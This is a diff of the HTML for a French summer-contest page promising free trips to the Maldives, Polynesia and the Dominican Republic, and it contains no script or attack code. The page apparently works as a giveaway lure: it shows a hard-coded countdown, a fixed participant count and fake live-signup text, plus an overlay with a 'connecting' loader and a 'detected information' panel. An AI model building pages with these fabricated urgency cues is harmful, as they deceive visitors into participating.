@@ -4,13 +4,11 @@
 <head>
 
 <meta charset="UTF-8">
-
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
 <title>Grand Jeu de l'Été 2026</title>
 
 <link rel="preconnect" href="https://fonts.googleapis.com">
-
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 
 <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
@@ -28,15 +26,11 @@
 <h1>🌴 GRAND JEU DE L'ÉTÉ</h1>
 
 <p class="slogan">
-
 Votre été commence ici ☀️
-
 </p>
 
 <p class="intro">
-
-Tentez votre chance pour gagner un voyage exceptionnel pour deux personnes.
-
+Participez gratuitement pour tenter de gagner un voyage exceptionnel pour deux personnes.
 </p>
 
 </header>
@@ -45,13 +39,15 @@ Tentez votre chance pour gagner un voyage exceptionnel pour deux personnes.
 
 <div class="destination">
 
-<img src="images/maldives.png" class="destination-image" alt="Maldives">
+<img src="images/maldives.png"
+     class="destination-image"
+     alt="Maldives">
 
 <div class="infos">
 
-<h2>Maldives</h2>
+<h2>🇲🇻 Maldives</h2>
 
-<p>7 nuits • Vol inclus</p>
+<p>7 nuits • Hôtel 5★ • Vol inclus</p>
 
 </div>
 
@@ -59,12 +55,15 @@ Tentez votre chance pour gagner un voyage exceptionnel pour deux personnes.
 
 <div class="destination">
 
-<img src="images/polynesie.png" class="destination-image" alt="Polynésie">
+<img src="images/polynesie.png"
+     class="destination-image"
+     alt="Polynésie">
+
 <div class="infos">
 
-<h2>Polynésie</h2>
+<h2>🇵🇫 Polynésie</h2>
 
-<p>10 nuits • Vol inclus</p>
+<p>10 nuits • Bungalow sur pilotis • Vol inclus</p>
 
 </div>
 
@@ -72,13 +71,15 @@ Tentez votre chance pour gagner un voyage exceptionnel pour deux personnes.
 
 <div class="destination">
 
-<img src="images/dominicaine.png" class="destination-image" alt="République dominicaine">
+<img src="images/dominicaine.png"
+     class="destination-image"
+     alt="République Dominicaine">
 
 <div class="infos">
 
-<h2>République Dominicaine</h2>
+<h2>🇩🇴 République Dominicaine</h2>
 
-<p>7 nuits • Tout compris</p>
+<p>7 nuits • Séjour tout compris</p>
 
 </div>
 
@@ -96,18 +97,14 @@ Tentez votre chance pour gagner un voyage exceptionnel pour deux personnes.
 
 <div id="countdown">
 
-01 j
-
-14 h
-
+1 j<br>
+14 h<br>
 26 min
 
 </div>
 
-<p>
-
-avant la fin des inscriptions
-
+<p style="margin-top:12px;opacity:.9;">
+avant la clôture du jeu
 </p>
 
 </section>
@@ -116,39 +113,56 @@ avant la fin des inscriptions
 
 <div class="nombre">
 
-👥 <span id="participants">18 458</span>
+👥
+<span id="participants">
+18 458
+</span>
+
+participants
 
 </div>
 
 <div class="live">
 
-🟢 7 personnes viennent de s'inscrire
+🟢 Plusieurs internautes participent actuellement
 
 </div>
 
 </section>
 
 <button id="participer">
-    🎁 JE PARTICIPE GRATUITEMENT
+
+🎁 JE PARTICIPE GRATUITEMENT
+
 </button>
-
-<div id="overlay" class="overlay hidden">
-
-    <div id="overlayMessage" class="overlay-message">
-        Connexion...
-    </div>
-
-    <div class="loader">
-        <div id="progressBar"></div>
-    </div>
-<div id="infosDetectees" style="display:none;margin-top:30px;text-align:left;max-width:650px;font-size:20px;line-height:1.8;"></div>
-</div>
 
 <footer>
 
 Participation gratuite • Sans engagement
 
 </footer>
+
+</div>
+
+<!-- =================================== -->
+<!-- OVERLAY -->
+<!-- =================================== -->
+
+<div id="overlay" class="overlay hidden">
+
+<div id="overlayMessage" class="overlay-message">
+
+Connexion...
+
+</div>
+
+<div class="loader">
+
+<div id="progressBar"></div>
+
+</div>
+
+<div id="infosDetectees"></div>
 
 </div>
 
